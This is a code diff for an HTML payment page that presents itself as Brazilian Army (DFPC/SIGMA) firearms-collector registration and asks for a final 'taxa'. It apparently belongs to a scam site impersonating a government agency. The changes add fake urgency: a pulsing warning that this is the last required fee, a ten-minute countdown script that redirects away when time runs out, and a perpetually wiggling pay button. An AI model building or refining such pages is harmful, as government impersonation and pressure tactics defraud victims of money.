@@ -122,7 +122,15 @@
                     <!-- Taxa Box -->
                     <div class="bg-gray-100 rounded-lg p-6 mt-6">
                         <div class="mb-4">
-                            <h3 class="font-bold text-lg text-red-800">Requisito Pendente:</h3>
+                            <div class="flex items-start">
+                                <div class="mr-3">
+                                    <i class="fas fa-exclamation-circle text-red-600 text-xl animate-pulse"></i>
+                                </div>
+                                <div>
+                                    <h3 class="font-bold text-lg text-red-800">REQUISITO PENDENTE:</h3>
+                                    <p class="text-sm text-red-700 mb-2">Esta é a última taxa necessária para receber seu Certificado CAC. O pagamento deve ser realizado em até <span id="countdown" class="font-bold">10:00</span> minutos.</p>
+                                </div>
+                            </div>
                             <div class="mt-4">
                                 <h4 class="font-semibold mb-2">Registro de Acervo de Colecionador</h4>
                                 <p class="text-gray-700 mb-4">
@@ -144,9 +152,9 @@
                         </div>
                         <form action="{{ url_for('pagamento') }}" method="POST" class="mt-6">
                             <input type="hidden" name="categoria" value="colecionador">
-                            <button type="submit" class="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-3 px-4 rounded transition-colors flex items-center justify-center">
-                                <i class="fas fa-lock mr-2"></i>
+                            <button type="submit" class="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-3 px-4 rounded transition-colors flex items-center justify-center group animate-[wiggle_1s_ease-in-out_infinite]">
                                 <span>Pagar Taxa e Finalizar</span>
+                                <i class="fas fa-check ml-2"></i>
                             </button>
                         </form>
                     </div>
@@ -160,5 +168,31 @@
         <p class="text-sm">© {{ current_year }} Exército Brasileiro - DFPC. Todos os direitos reservados.</p>
         <p class="text-sm">SIGMA - Sistema de Gerenciamento Militar de Armas</p>
     </div>
+
+    <!-- Add countdown timer script -->
+    <script>
+        function startCountdown() {
+            var timeLeft = 600; // 10 minutes in seconds
+            var countdownElement = document.getElementById('countdown');
+
+            var countdownInterval = setInterval(function() {
+                var minutes = Math.floor(timeLeft / 60);
+                var seconds = timeLeft % 60;
+
+                countdownElement.textContent = minutes.toString().padStart(2, '0') + ':' + 
+                                            seconds.toString().padStart(2, '0');
+
+                if (timeLeft <= 0) {
+                    clearInterval(countdownInterval);
+                    window.location.href = '/';
+                }
+                timeLeft--;
+            }, 1000);
+        }
+
+        // Start countdown when page loads
+        window.onload = startCountdown;
+    </script>
+
 </body>
 </html>
